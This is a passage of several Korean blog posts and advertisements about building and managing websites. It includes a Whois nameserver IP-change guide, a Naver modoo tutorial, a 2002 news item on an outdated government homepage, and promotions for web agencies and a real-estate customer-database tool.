​​♡ 문의와 답글 · 공감은 감사합니다 ♡​  춘천홈페이지제작 전문 에이앤디 문의전화010-3254-4262​춘천 AND 자사 홈페이지 (주)ANDABOUT WORKS CONTACT INSIDE LET ME INTRODUCE 주식회사 에이앤디는 수년간의 경력을 지닌 전문가들로 구성되어 있는 웹에이전시입니다. 소상공인부터 중소기업, 관공서 등 다양한 실적으로 경험과 노하우를 습득/보유하고 있습니다. www.iand.co.kr ​  후이즈 네임서버 관리 -> 홈페이지(웹서버) IP 변경 방법  ※ 본 내용은 네임서버 관리는 기존에 도메인을 등록했던 후이즈에서 그대로 유지하고 신규 홈페이지(웹)서버의 IP만 바꾸는 방법을 설명합니다.  1. 네임서버를 관리하고 있는 업체(=후이즈)에 로그인 후 네임서버 고급설정 메뉴로 이동합니다. 위 내용처럼 변경할 [도메인] 과 [네임서버호스팅서비스]를 선택후 확인을 누릅니다.   2. 변경하고자 하는 호스트명(www, mail 등)에 [체크]표시를 선택하고 변경할 신규서버의 IP 를 입력합니다.   3. 위에 입력한 내용을 확인하는 페이지입니다. 그대로 맞으면 [다음단계로] 클릭합니다.  4. 네임서버호스팅서비스 신청결과 [변경완료]로 표시되면 정상적으로 네임서버의 IP를 변경완료한 것입니다. (끝) 4. 변경된 정보가 반영될려면 최대 하루정도 걸립니다. 그 후에 윈도 도스창에서 ping www.catholictimes.org 입력 후 IP를 확인하면 됩니다. 도스창에서 확인결과 벌써 1.226.83.42 신규 서버의 IP로 변경이 된 것을 확인했습니다 ^.^  안녕하세요 펜션홈페이지제작 펜션사랑넷입니다.^^​코로나로 인하여 많은 펜션 점주님들께서 힘드신 시간을 보내고 있는데요이럴때 좀 더 펜션을 정비하고 홍보를 준비하여도약의 시간으로 움직이는 펜션주님들을 많이 보게 됩니다.​  ​펜션을 홍보하기 위해서는기본적인 홈페이지 서비스를 빼놓을 수 없지요!!​펜션홈페이지제작 펜션사랑넷은새롭게 홈페이지를 제작하거나 개편할때좋은 홈페이지 제작을 통해펜션 점주님들을 도와드리고 있습니다​  ​펜션사랑넷은기존에 오래되었던 디자인 구조와 시스템 인터페이스 구조를트렌드에 맞는 UI/UX의 구조로 제작되며스마트한 시대에 맞춰PC / 태블릿 / 스마트폰 어디서든 사용가능한펜션홈페이지를 제작하고 있습니다 ​펜션홈페이지제작 펜션사랑넷은20년 이상 홈페이지 제작을 하며 쌓은 노하우를 통해착한 비용으로 제작과 서비스를 할 수 있는 기반을 만들어놓았습니다​그결과트렌드와 다양한 기기의 호환성으로 제작하면서33만원의 착한 제작비용과 월 22,000원의 착한 월비용많은 펜션 점주님들의 관심을 받고 있는 펜션사랑넷입니다.  ​펜션홈페이지제작 펜션사랑넷은단순 제작만 하는것이 아니라앞으로 오랜기간 홈페이지를 관리 할 수 있는홈페이지 수정 시스템을 함께 제공하여직접 쉽고 편하게 홈페이지를 관리 할 수 있습니다  각종 컨텐츠를 한글 또는 파워포인트 처럼익숙한 인터페이스를 통해쉽게 관리 할 수 있고각종 공지와 이벤트를 안내하는 팝업도다양한 팝업 샘플과 간단한 텍스트 수정만으로팝업을 만들 수 있어 관리가 너무나 쉽게 되어 있습니다. 펜션홈페이지제작 펜션사랑넷을 통해 제작시짧은문자 13원과 긴문자 35원의 저렴한 문자비용으로문자 메세지를 운영할 수 있고!!​제작 준비시에 준비되는 자료가 부족한가요?펜션사랑넷에는 미리 준비되어 있는 제작 자료를 통해충분히 제작이 가능합니다​홈페이지 셀프 관리 시스템과 자동복구기능을 통해홈페이지 컨텐츠 관리가 더욱더쉽고 편하게 관리가 가능해집니다 펜션홈페이지제작시 펜션 예약 시스템은 또 어떻게 해야할지 고민인가요?펜션사랑넷은 홈페이지 제작시 펜션실시간 예약 시스템을별도 추가 비용 없이 기본 제공하니홈페이지 제작만 하면~!예약 시스템이 함께 적용됩니다!!!!  별도의 예약수수료 없어요!!무통장 결제시스템 기본 적용!!예약현황과 매출현황을 한눈에 확인 할 수 있는!!펜션 예약 시스템을 함께 적용해보세요^^ 펜션 홈페이지 제작을 하면서 사진촬영도 함께 하고 싶으신가요?주간, 야간, 드론 항공촬영까지 가능한사진작가를 통해 촬영을 해결해드립니다. 펜션홈페이지제작을 생각하신다면 제작과 관리까지 길게 바라보시고펜션사랑넷을 통해 진행해보세요​상담은 언제나 열려 있습니다.  펜션사랑넷펜션 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.pension-love.net ​ 안녕하세요, 별찌웹입니다.저렴한 비용으로 세련되고 깔끔한 농수산물 홈페이지 제작을 찾고 계시나요?​효율적인 관리자 기능 제공으로 수정부터 홈페이지 관리까지 걱정 마세요.  이제는 농수산물도 오프라인 보다 온라인을 통해 판매 시장이 점점 커지고 있죠.손쉬운 상품관리와 간편 결제까지 가능한 스마트한 농수산물 홈페이지 제작을 해보세요.​별찌웹은 1:1 제작 담당자 배정으로 처음 기획부터 제작  후 관리까지 완벽하게 도와드립니다. 과일, 잡곡, 수산물, 건어물, 떡, 다양한 식품의 홈페이지제작 경험과 실력을 갖춘 업체 선정이 중요합니다. ​농산물홈페이지제작을 위해서는 업종, 업체별 맞춤과다양한 편의 기능이 제공되는 꼭 확인해보세요.  한 번의 농수산물 홈페이지 제작으로모바일, 태블릿PC, 노트북 등 다양한 기기에 자동으로호환되는 반응형 기술을 이용합니다.​반응형 홈페이지 제작으로 제작 비용도 아끼고별도의 어려운 관리가 필요 없어 기업뿐 아니라개인 관리자도 간편하게 관리가 가능합니다. 모바일로도 가능한 상품 등록!관리자 페이지 제공으로 추가 비용 없이언제든지 팝업 안내, 상품 등록, 게시판 관리를 해보세요.쓰면 쓸수록 경제적이고 효율적인 농수산물 홈페이지 제작입니다. 직접 보고 선택하세요!별찌웹은 1:1제작 담당자 배정과각 분야의 전문가들로 구성된 전담팀 제작 시스템으로빠르고 확실한 농수산물홈페이지제작이 가능합니다.​최신 트렌드의 세련된 디자인과다양한 편의 기능을 제공하는 홈페이지 제작찾고 계시다면? 반응형홈페이지 상담신청반응형홈페이지 상담신청, 반응형쇼핑몰 상담신청, 반응형웹 상담신청byulzzi.com 지금, 바로 별찌웹에 문의 주세요.견적 및 상담문의는 언제든 환영입니다.감사합니다 :) ​  대구지방환경청 홈페이지 관리가 엉망이다.제18대 홍준석 대구지방환경청장이 지난 21일 부임하면서 홍청장의 학력과 주요경력, 가족사항등이 담긴 프로필을 각 언론에 배포했다.특히 26일 오후 2시 대구시 달서구 낙동강 달성습지에서 지역환경단체 회원과 공무원 등 150여명이 참가, 신임 홍준석 청장 부임 첫 철새보호행사를 실시한다고 홍보했다.이날 참가자들은 철새 먹이 2500kg을 주는 한편 불법엽구 수거 및 환경정화 활동을 펼치고 특히 한국조류보호협회에 의해 구조돼 치료가 완료된 천연기념물 황조롱이 등 조류 4마리를 방사한다는 것.관계자는 보도자료를 통해 희귀한 조류가 부상을 딛고 힘차게 새출발 하는 자리 힘찬 비상을 격려해 달라고 당부했다.그러나 대구지방환경청 홈페이지 청장과의 대화란에는 5일이 지난 25일 현재 까지도 "안녕하십니까 대구지방환경청장 한기선입니다". "21세기는 환경의 세기이며 파괴된 환경을 복구하고 지속 가능한 발전을 이루어 나가야하는 시기며 환경문제의 해결을 위해서는 모든 국민이 환경의 소중함을 깨닫고 실천하는 의식의 전환이 필요하다"는 한청장의 인사말이 담긴 내용이 버젓히 담겨져 있어 네티즌들을 당혹케하고있다.25일 '환경사랑 나랑사랑'이라고 밝힌 네티즌은 "대구지방환경청장이 얼마전에 새로 부임했다는데...그런데 이곳 홈피에는 여전히 한기선 청장으로 나와 있는데 누가 새로운 청장인지 분간을 못하겠다"며 홈페이지 관리 제대로 하라고 질타했다.한편 신임 홍준석 대구지방환경청장(43)은 80년 제24회 행정고시로 공직에 입문 환경부 폐기물 정책과장, 기획예산담당관 등을 거쳐 지난 21일 대구지방환경청장으로 부임했다.대구신문 김성용기자  kimsy@idaegu.co.kr      입력시간 : 2002-12-25 18:43:23 독립형홈페이지 제작 하면 관리가 안되신다고들 하시죠 ~  홈페이지는 무료관리 까지 받아보실수 있는 독립형홈페이지 입니다.홈페이지 주소도 모르고 사용하시는 업체들이 많이 있어 많이 안타까운 점도 있는데요 ~홈페이지 주소 쉽고 간단하게 선택 하실수 있는 장점과  독립형홈페이지 제작 완료 이후어떻게 해야 하나 고민 하지 마시고  무료등록 과 광고컨설팅을 같이 받아 보실수 있는  독립형홈페이지 입니다.#독립형홈페이지 #홈페이지제작 #사이트홈페이지관리 #홈페이지무료관리 #기업형홈페이지​https://0260064783.modoo.at/ [홈페이지제작 관리 - 홈] 포털사이트홈페이지 관리홈페이지제작, 사이트홈페이지제작, 바이럴, 동영상0260064783.modoo.at ​​ 요즘 홈페이지는 명함처럼  사용하시는 인테넷 명함이라고도 할수 있죠그만큼 인터넷을 접하는 일들이 과거에 비해서 훨씬 더 증가 하여 정보공유와  특히 홈페이지 하나만으로도 회사에 대한 이미지가 더 상승되느냐 혹은 하락하느냐에차이가 상당히 크기 때문에 이에 대한 부분도 결코 무시 할수가 없는 사안 입니다.그래서 더욱 감각적이고 업종에 대한 이미지를 확실하게 어필을 할수 있는독립형홈페이지 제작으로 관리까지 받아 보실수 있어 더욱 좋은 결과를 만끽해 보실 수가 있습니다.​ ​2020년 시간이 훌적 지나가고 있는 요즘  새해 나만의 확실한 독립형홈페이지로회사의 이미지 확실히  온라인으로 노출해보세요  ​​​ ​안녕하세요. 플레인입니다.​어제는은 어린이날!저도 마음만은 어린이니깐저도 회사를 쉬었습니다.​귀하디 귀한 빨간날이므로계속 해봐야지 생각했던네이버 modoo를 활용해개인 홈페이지를 만들어보았습니다.​오늘도 저의 경험을 이웃님들께공유해드릴게요.:-)  네이버 modoo ​네이버는 참 많은 일들을하고 있는 것 같습니다.​스마트스토어, 웹툰, 메타버스, 블로그 등등.요즘엔 블로그 마켓도가입을 할 수 있도록 해주더라구요.​그런데!무료로 모바일 홈페이지까지 만들 수 있는서비스를 제공하고 있습니다.​네이버 주주로서열일하는 네이버 뿌듯해요.​​모두에서는이름처럼 네이버 사용자 누구나 모두무료로 쉽게 홈페이지를 만들 수 있습니다.​ ​누구나 쉽게 만들 수 있도록 하기 위해서다양한 템플릿을 제공하고 있습니다.​템플릿을 제공하고 있다는 것은어느 정도 가인드라인을 준다는 말이기 때문에​한번도 홈페이지를 제작해본 적 없는 분이거나어떤 식으로 꾸며야할지 감이 잘 안오시는 분들도제공되는 템플릿을 잘 이용하면예쁜 홈페이지를 만드실 수 있을 것 같네요.​ ​업종별로 템플릿을 구분해개개인별로 원하는 구성 등을다르게 할 수 있습니다.​제가 대충 보니프리렌서는 자신의 포트폴리오를 관리하고홍보할 수 있는 홈페이지로,​가게를 운영하는 분은가게 운영 시간을 보여주고 예약 관리를 할 수 있는모바일 홈페이지로 만들도록 되어 있더라구요.​물론 템플릿을 사용하지 않고자신만의 스타일로 구성하실 수도 있습니다.​​업종별, 테마별 템플릿과 활용을 확인하고가입하는 것은아래 링크를 통해 하실 수 있습니다.​modoo! 바로가기https://www.modoo.at/home 누구나 쉽게 무료로 만드는 홈페이지누구나 쉽게 무료로 만들수 있는 모바일 홈페이지www.modoo.at  나두!시작하기 ​그럼 이제 저와 함께모바일 홈페이지를 만들어볼까요?!​ ​사용하고 있는 네이버 아이디를 이용해간단하게 회원가입만 해주시면홈페이지를 만들 수 있습니다.​스토어를 운영하시는 분께서스토어 홍보용 홈페이지를 만들고자 하신다면스토어 운영하는 아이디로 가입해주시는 게 좋겠죠?​개인사업자가 홈페이지를 만드실 경우'나도 만들기' 왼쪽 하단에 보이는사업자 등록하기를 눌러먼저 사업자 등록을 해주실 수도 있습니다. 요 부분은 홈페이지를 꾸민 후'정보 수정' 탭에서도 등록을 할 수 있으니추후에 필요에 따라 등록해주셔도 될 것 같네요.​ ​홈페이지 만드는 게 정말 간단하네요 :)​활용 안내는톡톡, 이메일로 안내받으실 수 있습니다.​ 제로보드 XE로 홈페이지 쇼핑몰 만들기COUPANGcoupa.ng ​가입 후 바로 홈페이지를 꾸며보도록 하겠습니다.​모두 홈페이지에서는다양한 템플릿을 제공하고 있기도 하고템플릿을 추천해주기도 해서기본 정보를 입력해주었습니다.​저는 지금 운영하고 있는 스마트스토어 용 말고운영하고 있는 이 블로그와 인스타그램을 통합해퍼스널 브랜딩 용으로 홈페이지를 제작해보려고 하기 때문에추천 템플릿을 '명함/자기소개'로 해주었습니다.​ ​추천 템플릿은 스킵해주셔도 문제 없고,실수로 창을 닫으셨더라도오른쪽 상단에 추천템플릿을 다시 열 수 있으니걱정마세요 :-)​ ​처음 시작하게 되면홈페이지 구성 안내가 나옵니다.​찬찬히 읽어보시면도움이 되실거에요 :)​ ​홈페이지를 구성하는 페이지는제일 윗 부분에 있고,페이지를 추가하거나 삭제할 수 있습니다.​ ​처음에 템플릿을 선택하면그 테마에 맞는 페이지들이 나타나는데,​거기서 필요한 페이지는 사용하고필요하지 않은 페이지는 삭제하시면 됩니다.​또 새롭게 필요하다고 생각하는 페이지는추가하실 수도 있구요.​페이지 이름 옆에 설정 아이콘을 눌러주시면삭제하거나 복사할 수 있습니다.​페이지를 추가할때는오른쪽에 있는 '페이지 추가'를 눌러주시면 됩니다.​페이지 이름을 수정하고자 하실때는이름을 마우스로 클릭하시면 됩니다.​ 삼성전자 올인원 일체형PC DM530ADA-L38AW (i3-1115G4 60.5cm)COUPANGcoupa.ng ​페이지를 삭제하고 추가하는 부분 아래는각각의 페이지를 꾸미는 곳입니다.​예전에 잠깐 앱 만들기를 독학해본 적 있는데프로그래밍을 하면핸드폰에 어떻게 나올지 보는게 있었거든요.​프로그래밍이랑 모두에서 홈페이지 만드는 거랑비슷하게 되어 있네요.​프로그래밍이 어느 정도 짜여진 것에나타나길 원하는 정보들을 입력한 후핸드폰과 pc에 어떻게 보여지는 지'미리보기'를 누르시면 확인 가능하다는 것이정말 비슷해요.​ ​각각의 페이지 내에서도템플릿이 있어서정말 누구나 만드실 수 있도록 되어 있습니다.​템플릿 이름 아래에 샘플도 보실 수 있으니참고해서 만드시면 됩니다.​++ 또모바일 홈페이지를 만드시면PC용 홈페이지도 같이 만들어집니다.​모바일용 홈페이지 제작 후비율 등을 조절해서 pc 용 홈페이지도 제작할 수 있어요!  홈 페이지 ​꾸미는 방법은 정말 쉽습니다.​각각의 페이지에 정보를모두 입력해주시면 됩니다.​ ​인터넷 주소, 도메인은https://000.modoo.at으로 보여지는 것입니다.​000은 영문 소문자와 숫자 조합으로최대 20글자까지 자유롭게 입력할 수 있으나다른 이용자가 선점하여사용하고 있는 도메인은 사용하실 수 없습니다.​보통 도메인은 한번 등록하면 수정이 불가능한데모두에서 사용하는 도메인은 수정할 수 있습니다.​수정하는 곳은 아래를 참고해주세요 :)​ "[모두] 홈페이지 > 우측 상단 [홈페이지 관리] > 내 홈페이지 목록> 홈페이지명 좌측 톱니바퀴 아이콘 선택> 팝업의 "홈페이지 필수 정보 / 검색 정보" 탭의 인터넷 주소"​ ​템플릿 순서에 맞춰서홈 배경 이미지 등록도 해주세요.​처음엔 이미지 등록이 잘 안되더니모바일로 임시 수정을 한번 해준 후로pc에 있는 이미지가 잘 올라가더라구요.​모바일에서 수정하는 방법은아래쪽에 설명해드릴게요!​ ​소개와 공지도 적어주었습니다.​정보를 입력하면 바로 바로반영이 되어 미리 볼 수 있어서 편했습니다.​ ​버튼은 홈페이지 아래쪽에항상 노출되는것으로꼭 사용하라고 해서등록해주었습니다.​제공되는 버튼인 전화, 스토어, 예약 등 말고저는 블로그, 인스타그램, 크라우드픽을등록해주었습니다.​버튼 이름 작성하는 곳 옆에'페이지 이동'은 '외부링크 이동'으로수정하실 수 있습니다.​다른 페이지로 이동하게 만들수도 있는데이것은 이동하고자 하는 페이지가 만들어졌을때설정할 수 있도록 되어 있어요.​처음 만드실땐 헤메실 수 있으니 참고해주세요 :)​​ Apple 2020년 맥 미니 (M1 칩셋 8코어 CPU 8코어 GPU)COUPANGcoupa.ng * 크라우드픽은제가 찍은 사진을상업적으로 판매할 수 있는 사이트입니다.​나중에 캐나다 워홀을 가면매일 매일 일기를브런치에 올려볼 생각인데실행하게 되면 버튼을 추가해주어야겠습니다.  SNS 페이지 ​저는 개인 SNS를 등록해주려고SNS 페이지를 추가해주었습니다.​SNS 페이지는블로그와 인스타그램을 연결할 수 있는 페이지로 1장만 등록하실 수 있습니다.​다른 외부 링크를 넣으시고 싶다면다른 페이지에서 버튼을 추가해버튼에 외부링크를 걸어주시면 됩니다.(아랫부분에 방법이 나옵니다. 참고해주세요)​ ​같은 네이버가 운영하는블로그라 그런지바로 연결이 되었고​모바일 미리보기로 확인해보니위 사진처럼 나오나봅니다.​오~ 괜찮은데요 ㅋㅋㅋ​인스타그램 계정자꾸 인증에서 오류가 나서다른 페이지로 따로 빼주었습니다.​ ​내 블로그에도 modoo! 명함을 달 수 있습니다,​명함을 다는 것은홈페이지를 공개로 했을때 이용가능합니다.  이미지+버튼 페이지 ​크라우드픽 계정을 추가해주기 위해새 페이지를 추가해주었습니다.​이건 이미지+버튼 페이지입니다.​ ​이미지를 올려주고,​구성요소 추가를 통해텍스트를 넣어 설명을 써주었습니다.​미리보기에 나오는이미지, 텍스트, 버튼 등을 클릭하면클릭한 것의 정보를 수정할 수 있는 내용들이오른편에 나옵니다.​ ​버튼 이름을'작가 페이지 바로가기'로, 설정해주고버튼을 누르면 외부 링크로 이동하도록 해준 후외부 링크를 걸어주었습니다.​버튼은 여러 개 추가하실 수 있습니다.​​ Apple 2020년 맥북 에어 13COUPANGcoupa.ng  완성! ​네이버 검색에 노출이 되었으면 해서노출도 설정해주었어요.  모바일에서 수정하기​ ​네이버 모바일 앱에서도홈페이지를 수정할 수 있습니다.​ ​오른쪽 상단에 있는 '홈페이지관리'에서수정하면 되는데요.​ ​방문자수 등 홈페이지 전반적인 부분을확인하거나 수정 할 수 있습니다.​ ​페이지를 누르면 나오는 연필 모양 아이콘을 누르면pc에서 수정했던 내용을 이어서 수정할 수 있습니다.​​  그렇게 만들어진저의 모두 홈페이지 입니다.​https://everydayisspecial.modoo.at [평범한 날의 특별한 기록 - 홈]Everyday is special.everydayisspecial.modoo.at ​어떤가요?여러가지 페이지들이 있고각각의 페이지를 제 스타일대로 꾸밀 수도 있어서​잘만 이용하면프로그래밍을 하지 못하는 분들도쉽게 모바일용/웹용 홈페이지를만드실 수 있을거 같습니다.​최고 👍​홈페이지 만드시는 것에 관심 있으셨던  이웃님들은모두! 한번 이용해보시면 좋을 것 같습니다.​​오늘도 저의 글을 읽어주셔서 감사드리며도움이 되셨다면댓글과 하트 남겨주세요 :)​감사합니다.​  본 포스팅에 포함된 링크를 통해 제품 구매 시파트너스 활동을 통해 일정액의 수수료를 제공 받을 수 있습니다. http://www.daeguline.com/m/main.html 대구라인-모바일 홈페이지사업자등록번호: 503-19-74148 대표자: 이상훈 Copyright (C)2000~2020 daeguline. All rights Reservedwww.daeguline.com #대구홈페이지 제작 및 관리는#대구라인 에서#홈페이지쇼핑몰 만들기만 하고 끝나는 게 아니라 관리도 믿고 맡길 수 있는 곳이어야겠죠.정직함으로 회사를 운영합니다.#반응형홈페이지 제작 2000년부터 대표로 일하는 동생입니다.070-8288-8906​#대구라인홈페이지 검색하면 주소가 뜨네요.평리동에 있어요.  대구라인대구광역시 서구 평리동 1321-13 #대구홈페이지제작#대구쇼핑몰제작#홈페이지관리 #쇼핑몰관리 회사#대구라인 ​홈페이지를 만들겠다고 혹은 만들어야겠다고 생각을 했을때는 어떤 이유였나요?대다수는 "나""우리회사""쇼핑몰"알려야 겠다 그리고 수익을 높혀야겠다 이런 마인드였을 거라 여겨지는데요 ​​단순히 우리가 남의 홈페이지는많이 봤잖아요 근데 직접 홈페이지를 구비해야겠다는 맘이 들었을때혹시 내가 직접?!이런 생각 안하신 분 없을거라생각해요 ​ ​​" ㅎㅎㅎ " 저도 그랬거든요 ​근데.. 포기.!!! 많은 분들인 스스로 홈페이지를 만들기를 해보다가 결국은 유료 홈페이지제작을 선택하는경우를 보게 되어요 물론..취지는 나쁘지 않지만 괜한 시간 낭비 하기보단실용적인면서 가독성이 높으면서 비용적으로 만족할 만한곳을 찾는게 우선이더라구요 ​​ ​​경험자로서 업체를 선택할때 나름의 기준이 있었어요 #부산홈페이지제작 원하시는 분들도 어떤 방법으로 접근할지 모르겠다면 가장 기본이 되었던 저만의 이것만큼은......꼭 필요하다 정도 참고해주세요 ​​ ​비용 저렴하고 내 홈페이지로 만들기>>​​견적을 몇군데 받아보니 가격차이는 왜그렇게 나는지 모르겠더라구요 근데 구성을 따져보니 그렇게 항목별로 그리 차이가 나진 않는거 같고.. 근데 찾았어요~~ 일단 제작비 없이 홈페이지 관리 명목으로 월 지출 딱!! 3만원만으로 제작 들어갈수있더라구요 ​게다가 운영기간을 5년으로 두었을때.. 홈페이지가 나한테 넘어오는데기존 매년 계약만 하고 결국은 내게 아닌 홈페이지랑은 조금 다른 방식이더라구요 ​ ​​#부산홈페이지제작수정!!  당연히...되는거 아닌가요>​​라고...알고 계신분들 많은시죠 이점은 그래서 시작하기 전에 꼭 알아봐야 될 사항이었는데요 시안,결과물을 받고 나면 구두로 전했던 내용과는 다를경우가 너~~~무많아요 ​이것때문에 얼굴인상 찌그러지는경우 많죠 그래서 수정은 당연히있어야 하는데요 ​제작후 언제든 수정이 가능한 곳을 선택해주세요!!​​ ​ ​ ​만들기만 하면 다냐고? 사후 제공무료 혜택은?>​​홈페이지 제작 안해본사람이 어떻게 알까요?단순히 홈페이지 만들기만 생각했지 바이러스 관리나 랜....썬 웨어... 뭐 자료 보관..이거 모르는 경우 많죠.. 이런 부가적인 내용은 반드시 필요한데아마도 필요사항을 모를경우가 많아요 업체에서 무료지원으로 제공하는곳알아보셔야죠..​​  일단..!! 위 3가지 조건 다 해당되는 부산홈페이지제작▶▶ 요기견적이 부족하다면 일단 추가해보세요 ​ ​부산홈페이지제작 은..알아볼때..전문 디자인의 오랜 경력으로 동일 탬프릿 형태가 아니라 전문적인 특성을 살려 직접적으로 작업 해드리고 있죠 ​​누구보다.. 홈페이지가 중요한 요즘 쇼핑몰에서는 훨씬더 퀄리티 높은 결과물을 보이고있는데요 고객만족도가 높기 때문에 일단.. 관련 실제 작업물의대한 이야기 나눠보시면서 고민해보심 되겠죠 ​​ ​​점심시간이네요 맛있는 점심덥지만.. 지치지 않은 오후되세요 ​​  ​​​  ​​​​​ ​ 부동산쪽은 전혀 예측할 수 없을 정도로 어느때는 바쁜시기, 어느때는 한가한 시기를 보낼 때가 많이 있습니다. 그래도 거의 대부분 부동산 계열은 많은 고객이 방문을 하기 때문에 고객의 대한 정보와 내용을 기록하는 것이 가장 중요한 부분이기도 하지요. 그런것에 있어서 가장 필요로한 부동산홈페이지 의 관련된 관리방법을 알아보도록 하겠습니다.   부동산홈페이지를 운영하기에 앞서, 주로 많이 이용하시게 될 분들은 영업자 라고 말씀드릴 수 있습니다. 하루에 문의연락 및 방문고객이 많이 때문에 자칫 잘못 기록을 했다가는 그 고객을 잃을 수 있는 부분이 있습니다. 이러한 부분을 보완하기 위해서는 확실하게 부동산홈페이지를 운영하는 것이 좋은데요. 그때그때 관리를 함으로써 세심하게 고객을 응대하기 편안함으로 서로의 불편함 없이 업무처리가 빠르게 된다는 점도 있다고 말씀드릴 수 있습니다.   DB관리 디비쉐어 솔루션이란? 사업하시는 분들에게 가장 편리하게 이용할 수 있는 프로그램 으로, 사업에 맞게 알맞는 구성이 알차게 들어가 있는 프로그램 이라고 말씀드릴 수 있습니다. 간단한 인터페이스와 편리한 기능이 갖추어져 있어 한번에 부동산홈페이지를 관리하기에 매우 편리하게 이용이 가능하다고 말씀드릴 수 있는데요. 솔루션을 사용함으로써 DB유입 분석, 마이페이지, 검색및 엑셀다운로드, 엑셀업로드 부분까지 사업장에 편안함을 갖추고 있는 프로그램 입니다.​   부동산 홈페이지 주로 많이 사용하는 사람은 ? 디비쉐어는 한층 업그레이드된 프로그램 으로 고객과의 상담내역, 유입내역분석이 가능하여 고객의 대한 상세한 내용을 재검토 할 수 있는 장점이 있는데요. 더욱 편리한 부분은 추가비 없는 사업권을 계속 추가할 수 있기 때문에 언제든 이 프로그램을 통한 고객들의 통합 관리가 가능 합니다. 또한 영업을 했었던 내용을 영업자의 따른 분석이 가능하여 수당의 대한 정산이 자동으로 결산이 되어 복잡한 계산기를 두들길 필요 없는 필요성을 갖추고 있습니다​   영업자 실적과 정산 관리부동산홈페이지를 관리하면서도 어떤 영업사원이 좀더 실적이 많은지, 적은지를 정확하게 판단할 필요성도 있는데요. DB관리로 영업자의 실적과 정산을 정확히 관리할 수 있기 때문에 사업권의 전체적인 통계분석이 가능하다고 볼 수 있습니다. 사업장을 빠르게 순환하고 어떤식으로 관리하느냐에 따라서 고객들의 신뢰도와 관심을 받을 수 있기 때문에 이러한 작은 부분에서 부터 세심하게 시작한다면 분명 사업에서도 큰 성공을 하지 않을까 싶습니다.​   가성비 좋은 부동산 광고까지 단 한번에 이 프로그램은 DB신청한 고객의 상담내역을 정확하게 분석할 수 있기 때문에 아무래도 꼼꼼하게 체크해 보지 못했던 부분도 다시 되짚어 볼 수 있다는 큰 장점이 있습니다. 어떠한 유입경로로 들어왔는지 아이피까지 확인이 되기 때문에 그 유입경로의 대한 광고를 좀더 체크할 수 있습니다. 고객의 대한 정보를 확인하고 상담원을 배정할 수 있는 부분이 있기 때문에 필요한 부분만 정확하게 집어낼 수 있다는 부분이 있지요. 어떤 영업자가 좀더 업무를 잘 수행하고 있는지, 실적이 어떠한지, 수당이 어느정도 되는지 미리 예측할 수 있기 때문에 불필요한 부분에 사업자금이 나가지 않도록 도와줄 수 있는 프로그램 입니다. 또한, 고객과의 상담한 내용과 관리자 메모를 검토해 볼 수 있기 때문에 실시간 으로도 고객과의 상담내용을 체크할 수 있어 상황판단을 정확하게 할 수 있다는 장점이 있습니다. 손쉬운 프로그램으로 영업자들의 관리를 할 수 있기 때문에, 영업자 추가가 될 시 개벌적인 URL을 자동으로 적용이 되며, 영업자별 실적 및 효율부분도 항상 검토를 해볼 수 있는 프로그램 입니다.   DB 통합 관리 시스템  : 관리자 페이지 / 영업자 페이지 관리자도 전체적인 사업권 DB확인 및 관리는 물론, 사업권 별로 영업자의 실적을 항상 조회를 할 수 있기 때문에, 불필요한 금전적인 손실이 없도록 도와드리고 있습니다. 별도로 DB삭제 기능도 들어가 있기 때문에 관리자도 편리하게 이용이 가능합니다. 별도의 상담이 완료된 고객의 경우 승인대기 확인 시스템이 갖추어져 있어, 어느 고객이 상담이 완료가 되었는지, 미완료 되었는지의 대한 부분도 검토할 수 있습니다. 영업자 들의 유입 및 실적에 따라서 마케팅플랜설계 분석과 방향성을 설정할 수 있는데요. 이러한 분석을 통해서 마케팅 광고 비용이 불필요하게 사용이 되지 않도록 관리가 철저히 된다는 장점이 있습니다. 앞서 말씀 드린것 처럼 사업장이 늘어나도 추가적인 생성이 가능하기에, 사업장을 늘린만큼 각종 다양하게 무한으로 생성이 가능하기 때문에 필요성을 더 느낄 수 있는 프로그램이며, 그에 따른 추가적인 제작비용 없이 사업장을 늘릴 수 있어 언제든 부담없이 사용할 수 있는 프로그램이라고 설명할 수 있습니다. 한번 클릭만으로도 사업권을 추가할 수 있기 때문에 간단한 설명으로도 누구든지 이용할 수 있는 편리한 통합관리 시스템 이라고 말씀드릴 수 있습니다.   영업자 별도의 개인 페이지 제공 별도의 영업자 분들의 관리 시스템이 갖추어져 있어, 개별적인 본인의 홍보마케팅이 가능합니다. 관리자 가 영업자 코드 발급시스템, 영업자 실적관리, 수당 자동정산가능 등 편리하게 확인을 할 수 있기 때문에, 많은 사업장과 다양한 영업자가 있어도 전혀 머리 아플일이 없어 간편하고 빠른 수당정산이 가능합니다. 영업자들 에게는 따로 개별적인 URL 자동생성이 가능하며, 별도의 마이페이지를 제공함으로써 좀더 섬세한 고객의 관리가 가능하다고 말씀드릴 수 있습니다. 유입부분에서 부터, 모든 히스테리가 다양하게 남아 있기 때문에 어느정도의 DB유입 흐름을 체크해 볼 수 있기 때문에 간편한 이용이 가능하다고 말씀드릴 수 있습니다.​   디비쉐어 실시간 문자알림 서비스 제공 단 한명의 고객도 놓치지 않는 편리하고 간편한 프로그램 이라고 말씀드릴 수 있습니다. SMS관리 및 DB유입 시 알림기능, 간단한 문자 수신/발신이 가능한 프로그램 이기도 한데요. ‘내 휴대폰 으로도 쉽게 쓸 수 있는데 뭐하러 신청하나’ 라고 생각 하신다면 간단하게 이 프로그램의 대한 설명을 드려보겠습니다. SMS관리 시스템은 사업권 별로 수신발신자를 개별 설정을 할 수 있습니다. 이에 따른 SMS알림 기능으로 단 한명의 고객도 놓치지 않는 상담연결이 될 수 있기 때문에 좀더 수월한 업무가 가능하다고 볼 수 있지요. 간편한 문자 수실 이용은 아이피 유입주소와 유입된 날로부터의 영업자 확인이 가능하기 때문에 한번에 세가지 업무를 빠르게 처리할 수 있다는 장점이 있습니다.​   고객과의 빠른 소통을 원하신다면 광고주가 보는 입장에서는 사업권내 DB확인과, 관리자와의 1대1 상담 알림톡을 이용할 수 있습니다. 흔하게 바쁜 사업장 이라면 전화연락이 더욱이 안되는 곳이 많기 때문에, 이러한 프로그램을 이용함 으로써 고객의 편안함을 생각해 제작이 되어, 별도의 클레임 이나 불편함을 최소화 할 수 있다는 장점이 있습니다. 간단하게 설명을 드리자면 바쁜 업무 중에서도 고객이 상담을 요청할 경우 별도의 담당 영업자에게 상담 알림문자 서비스를 받을 수 있습니다. 바쁜 업무를 마치고 나서 문자 확인 후 고객과의 소통이 빠르게 이루어 질 수 있기 때문에 영업자,고객 서로에게도 편리하고 빠르게 이용을 할 수 있다는 장점이 있습니다.​   기본적인 